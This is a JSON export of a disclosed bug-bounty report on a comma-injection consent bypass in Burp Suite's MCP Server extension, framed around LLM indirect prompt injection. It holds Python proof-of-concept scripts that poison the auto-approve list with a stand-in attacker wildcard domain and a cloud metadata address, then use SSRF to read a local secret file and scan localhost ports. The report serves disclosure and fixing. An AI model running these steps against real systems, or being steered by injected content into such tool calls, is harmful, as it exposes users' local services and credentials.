@@ -1,0 +1,134 @@
+{
+  "id": 3717354,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzE3MzU0",
+  "url": "https://hackerone.com/reports/3717354",
+  "title": "UI Consent Bypass via Comma Injection in `addAutoApproveTarget` — User-Approval Dialog and Persistence Layer Disagree on Target Scope, Yielding Authen",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "none",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-06T19:15:35.108Z",
+  "submitted_at": "2026-05-06T19:15:35.510Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "hacker-kartel",
+    "url": "/hacker-kartel",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/gij1j7hvqgmxcg197cwagnth8zlj/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15252,
+    "url": "https://hackerone.com/portswigger",
+    "handle": "portswigger",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "PortSwigger Web Security",
+      "twitter_handle": "Burp_Suite",
+      "website": "https://portswigger.net",
+      "about": "Burp Suite is the leading software for web security testing"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-06-15T09:21:46.631Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-05-16T09:21:36.324Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nBurp Suite MCP Server BApp v1.2.1 fails to validate hostnames passed to `addAutoApproveTarget` (`McpConfig.kt:52`). A single user click on the per-request approval dialog persists an attacker-controlled comma-separated hostname as multiple independent allow-list entries, because `_autoApproveTargets` is stored as a comma-joined string and `getAutoApproveTargetsList` re-splits on `,` (`McpConfig.kt:73`).\n\nA malicious MCP client — or an LLM operating on attacker-controlled content via indirect prompt injection (the canonical MCP threat model) — can poison the auto-approve list with one click, then silently SSRF to localhost services, internal hosts, cloud metadata, and arbitrary wildcard subdomain trees without any further interaction.\nThis regresses the protection model that motivated report #3176157\n\n## Threat Model\n\nCanonical MCP indirect prompt injection. An LLM (Claude Desktop, Cursor, Cline, etc.) connected to Burp's MCP server reads attacker-influenced content (web page, document, ticket, search result) and constructs a `send_http1_request` tool call with an attacker-chosen `targetHostname`. The user sees one approval dialog, clicks **Always Allow Host** trusting the leading legitimate-looking domain, and that single click persists multiple silent allow-rules the inverse of the user's intent.\n\n## Root Cause\n\n**Sink 1 — Storage accepts unvalidated multi-host string**\n`src/main/kotlin/net/portswigger/mcp/config/McpConfig.kt`, lines 52–60:\n\n```kotlin\nfun addAutoApproveTarget(target: String): Boolean {\n    val currentTargets = getAutoApproveTargetsList()\n    if (target.trim().isNotEmpty() && !currentTargets.contains(target.trim())) {\n        val newTargets = currentTargets + target.trim()\n        autoApproveTargets = newTargets.joinToString(\",\")\n        return true\n    }\n    return false\n}\n```\n\n`TargetValidation.isValidTarget` exists in the codebase but is never invoked here. Only emptiness and duplication are checked.\n\n**Sink 2 — Reader splits on the same delimiter used to write**\n`src/main/kotlin/net/portswigger/mcp/config/McpConfig.kt`, lines 73–79:\n\n```kotlin\nfun getAutoApproveTargetsList(): List<String> {\n    return if (_autoApproveTargets.isBlank()) emptyList()\n    else _autoApproveTargets.split(\",\").map { it.trim() }.filter { it.isNotEmpty() }\n}\n```\n\nOne write of `\"a,b,c\"` becomes three independent entries on read.\n\n**Sink 3 — Attacker-controlled hostname passed straight from JSON-RPC to persistence**\n`src/main/kotlin/net/portswigger/mcp/security/HttpRequestSecurity.kt`, lines 44, 49:\n\n```kotlin\n1 -> { config.addAutoApproveTarget(hostname); continuation.resume(true) }\n2 -> { config.addAutoApproveTarget(\"$hostname:$port\"); continuation.resume(true) }\n```\n\n`hostname` originates from the `targetHostname` JSON-RPC parameter of the `send_http1_request` (and related) MCP tools — fully attacker-controlled.\n\n**Sink 4 — Dialog renders payload verbatim, masking what gets persisted**\n`src/main/kotlin/net/portswigger/mcp/config/Dialogs.kt`, `showOptionDialog`:\n\nThe approval dialog renders `Target: $hostname:$port` in a `JTextArea` with no escaping or splitting. A comma-laden hostname displays on a single line beginning with the leading domain, which a user reasonably reads as the target. This is the misrepresentation that makes CWE-451 apply: what the user authorizes = what the system persists.\n\n## Reproduction\nTested against running BApp v1.2.1 on Kali Linux\n\n### Pre-conditions\n\n1. Burp MCP Server BApp v1.2.1 installed and enabled (Burp → MCP tab → Enabled)\n2. \"Require approval for HTTP requests\" checked (default state on fresh install)\n3. Auto-Approved HTTP Targets list cleared (Burp → MCP tab → Auto-Approved HTTP Targets → \"Clear All\")\n\n### Setup victim service for file-read demonstration\n\n```bash\nmkdir -p /tmp/internal && echo \"INTERNAL_API_KEY=sk_live_abc123_DO_NOT_LEAK\" > /tmp/internal/secret.txt\ncd /tmp/internal && python3 -m http.server 8123 &\n```\n### Step 1 — Poison the auto-approve list with one tool call\n\n```bash\npython3 - << 'EOF'\nimport asyncio\nfrom mcp.client.sse import sse_client\nfrom mcp import ClientSession\n\nasync def main():\n    async with sse_client(\"http://127.0.0.1:9876/\") as (r, w):\n        async with ClientSession(r, w) as s:\n            await s.initialize()\n            await s.call_tool(\"send_http1_request\", {\n                \"content\": \"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\",\n                \"targetHostname\": \"example.com,127.0.0.1,*.attacker.com,169.254.169.254\",\n                \"targetPort\": 443,\n                \"usesHttps\": True,\n            })\n\nasyncio.run(main())\nEOF\n```\nThe Burp approval dialog appears showing:     \nAn MCP client is requesting to send an HTTP request to:\nTarget: example.com,127.0.0.1,*.attacker.com,169.254.169.254:443\n{F5866201}\n\nClick   Always Allow Host\n\n### Step 2 — Verify list poisoning (consent ≠ persistence)\n\nBurp → MCP tab → Auto-Approved HTTP Targets now contains four independent entries:\n\n- `example.com`\n- `127.0.0.1`\n- `*.attacker.com`\n- `169.254.169.254`\n\nThe user authorized one target string; the system persisted four. This is the consent bypass.\n{F5866214}\n\n\n\n### Step 3 — SSRF without further approval\n\n```bash\npython3 - << 'EOF' | tee /tmp/mcp-poc/ssrf_output.txt\nimport asyncio\nfrom mcp.client.sse import sse_client\nfrom mcp import ClientSession\n\nasync def call(host, port, path, https=False):\n    async with sse_client(\"http://127.0.0.1:9876/\") as (r, w):\n        async with ClientSession(r, w) as s:\n            await s.initialize()\n            res = await s.call_tool(\"send_http1_request\", {\n                \"content\": f\"GET {path} HTTP/1.1\\r\\nHost: {host}\\r\\n\\r\\n\",\n                \"targetHostname\": host, \"targetPort\": port, \"usesHttps\": https,\n            })\n            txt = res.content[0].text if res.content else \"(empty)\"\n            print(f\"[{host}:{port}{path}] -> {txt[:300]}\")\n            print(\"---\")\n\nasync def main():\n    await call(\"127.0.0.1\", 8123, \"/secret.txt\")\n    await call(\"evil.attacker.com\", 443, \"/\", True)\n    for p in [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]:\n        await call(\"127.0.0.1\", p, \"/\")\n\nasyncio.run(main())\nEOF\n```\n\nresults\n\n## Impact\n\nLocal file read: /tmp/internal/secret.txt contents exfiltrated via 127.0.0.1:8123 (maps directly to \"A website accessed through Burp Suite can retrieve local files from the user's system\" — Medium per policy)\n\nLocalhost service fingerprinting: Burp Pro admin interface identified at 127.0.0.1:8080, OpenSSH version banner at 127.0.0.1:22\n\nLocalhost port enumeration: 9 ports probed silently in a single script (22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017)\n\nWildcard subdomain SSRF: evil.attacker.com matches the injected *.attacker.com entry\nCloud metadata reachable: 169.254.169.254 callable without prompt (relevant on cloud-hosted Burp)\n\nHTTP history exfiltration (after one separate consent click on get_proxy_http_history): full request/response pairs from prior browsing. Real test against authenticated sessions returned long-lived Google OAuth refresh tokens, OAuth client_secret values, Google API keys, and HackerOne __Host-session / cf_clearance / X-Csrf-Token. Maps directly to \"A website accessed through Burp Suite can extract cross-domain data from Burp's sitemap\" — Medium per policy.",
+  "weakness": {
+    "id": 1627,
+    "name": "LLM09:2025 Misinformation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5866201,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y6zayyh70cegfx9o05fm6zeyzq4h?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR3DB6M2T%2F20260615%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260615T101805Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFO9iiI3XfbV7yizeW95caq8PkIeiJT1r2Q0cLlNhrXEAiAHgwtvj1Y3FJT2cQeFZrgCAsqhDgcumKZacXFwA8OCKiqyBQhaEAMaDDAxMzYxOTI3NDg0OSIMXnMY%2BxHpDqvzWkoEKo8F31DgNmNkNUI3C%2F5cn1lgp5d%2FxMuG15R1pqJuNQOV1kQIys7Yw7n1m3Fo%2FLTBS9TUBD0ya5Ep5ur3GgwitWtMwMLfiZi269HjcgKydmoeBQawJv6mCJegA9%2BJ0bzk83db%2BODzBYVeF7EE4hUr9L1Htm3BJmoPMqGNR9hgBhmJ%2F5F%2BxwVJaOKsNm5hvU%2FZIHGSYYTESJyGzC%2BdzV%2Fan15qlN%2BEReo5n8VO6MdL92sIOavWKe6YHjPX%2FTPghbHsnS1XU6x50YftODd%2FVq9hpYEPemtYjmIQifGhfSjscut%2Fk%2BPpOmhLP4bzfBLUqKITu%2FtVb1KLE7pU7SNMUo6jiSB1ypC%2FarGT4eobSkjkCCn26vEh%2FLQBd4HWW4rCx9%2BJaJacQz%2F34zcjYXNqDLGaE1a4u2Z7mXPxisITeBYJlPmWrVIwK560egkekoQxklfVrGLNDe5NFpbMMpju0bc08iN2L3jpGmS9FkO3YRNFJp0HIen2Sq93cv1I%2F7rzX3rUO%2BzCO9Rv7avG%2FcgcRXVheIunCGHeWy3A3Q%2FKKWSutKSC79IzVxngmYC%2FtYo8MtjWKtVqo9B1nfLbzJX24okb8w9zKB9puJTNVkDMQzVMUVuoq%2B4QbHg2fq32tyd%2B%2B%2Bq87buypIKVgsPRqOHRQ63Hl4E6zH9%2BQviysJHsszG6qpuqCKHMm%2F5KJu0e42ZZ7wXV%2BcrXdq5Gb%2BvYMJF74ZlU8D1In4iZkd1LY6heny6Z7qU59rWwFS8WO4x26rTwX6VpPPTaN2IyqtQTC%2FXJfGSbjmUsgL%2BsCWl0%2FewEAqfAHkBmK%2Fumzsmzj4APdbvGFTWnVzEe7zmSxtKj%2B2lv2FuSnE6fFm4DHW9noa4Fs6Gh1BgMTzDa7b7RBjqyAa%2FZHm%2BEIeIKbOcKbA8mrbWKAeXSdZE402TDYPBO2vbaP9%2BLd%2Fb%2FV3IjV3SEweodkBICSoIA9IET7ve6%2FniMQLwn%2F6552AZjMv1nljopHIQ5nQWLNyCVwHKajPeACSRX5pT8jYwCV0Op3769yc27dn15bwakF1XKld6n0wRvWG7G9G%2FokfhBbgoP1HuP8JXCudKgkB3JaQtsflggUA%2F00YUdXB1HhwUX%2F7tJKgglKJqRoa0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6249bd5767b4c5d7505d55f66511cc9b29cac089634cf700801188b700624c89",
+      "file_size": 24135,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5866214,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/aq7cp33v0bdcof5283ex6h2ixv8e?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR3DB6M2T%2F20260615%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260615T101805Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFO9iiI3XfbV7yizeW95caq8PkIeiJT1r2Q0cLlNhrXEAiAHgwtvj1Y3FJT2cQeFZrgCAsqhDgcumKZacXFwA8OCKiqyBQhaEAMaDDAxMzYxOTI3NDg0OSIMXnMY%2BxHpDqvzWkoEKo8F31DgNmNkNUI3C%2F5cn1lgp5d%2FxMuG15R1pqJuNQOV1kQIys7Yw7n1m3Fo%2FLTBS9TUBD0ya5Ep5ur3GgwitWtMwMLfiZi269HjcgKydmoeBQawJv6mCJegA9%2BJ0bzk83db%2BODzBYVeF7EE4hUr9L1Htm3BJmoPMqGNR9hgBhmJ%2F5F%2BxwVJaOKsNm5hvU%2FZIHGSYYTESJyGzC%2BdzV%2Fan15qlN%2BEReo5n8VO6MdL92sIOavWKe6YHjPX%2FTPghbHsnS1XU6x50YftODd%2FVq9hpYEPemtYjmIQifGhfSjscut%2Fk%2BPpOmhLP4bzfBLUqKITu%2FtVb1KLE7pU7SNMUo6jiSB1ypC%2FarGT4eobSkjkCCn26vEh%2FLQBd4HWW4rCx9%2BJaJacQz%2F34zcjYXNqDLGaE1a4u2Z7mXPxisITeBYJlPmWrVIwK560egkekoQxklfVrGLNDe5NFpbMMpju0bc08iN2L3jpGmS9FkO3YRNFJp0HIen2Sq93cv1I%2F7rzX3rUO%2BzCO9Rv7avG%2FcgcRXVheIunCGHeWy3A3Q%2FKKWSutKSC79IzVxngmYC%2FtYo8MtjWKtVqo9B1nfLbzJX24okb8w9zKB9puJTNVkDMQzVMUVuoq%2B4QbHg2fq32tyd%2B%2B%2Bq87buypIKVgsPRqOHRQ63Hl4E6zH9%2BQviysJHsszG6qpuqCKHMm%2F5KJu0e42ZZ7wXV%2BcrXdq5Gb%2BvYMJF74ZlU8D1In4iZkd1LY6heny6Z7qU59rWwFS8WO4x26rTwX6VpPPTaN2IyqtQTC%2FXJfGSbjmUsgL%2BsCWl0%2FewEAqfAHkBmK%2Fumzsmzj4APdbvGFTWnVzEe7zmSxtKj%2B2lv2FuSnE6fFm4DHW9noa4Fs6Gh1BgMTzDa7b7RBjqyAa%2FZHm%2BEIeIKbOcKbA8mrbWKAeXSdZE402TDYPBO2vbaP9%2BLd%2Fb%2FV3IjV3SEweodkBICSoIA9IET7ve6%2FniMQLwn%2F6552AZjMv1nljopHIQ5nQWLNyCVwHKajPeACSRX5pT8jYwCV0Op3769yc27dn15bwakF1XKld6n0wRvWG7G9G%2FokfhBbgoP1HuP8JXCudKgkB3JaQtsflggUA%2F00YUdXB1HhwUX%2F7tJKgglKJqRoa0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0e436ae4644497a43f511a6cd7898ae8cc91f094c7cf6324c80fbeab1f139b0a",
+      "file_size": 53397,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-06-15T09:21:37.051Z",
+  "allow_singular_disclosure_after": -3388.100858728,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "2026",
+    "hacker-kartel",
+    "kinyasteh"
+  ],
+  "severity": {
+    "rating": "none",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 170,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "Burp Suite Extension (BApps)",
+    "max_severity": "none"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
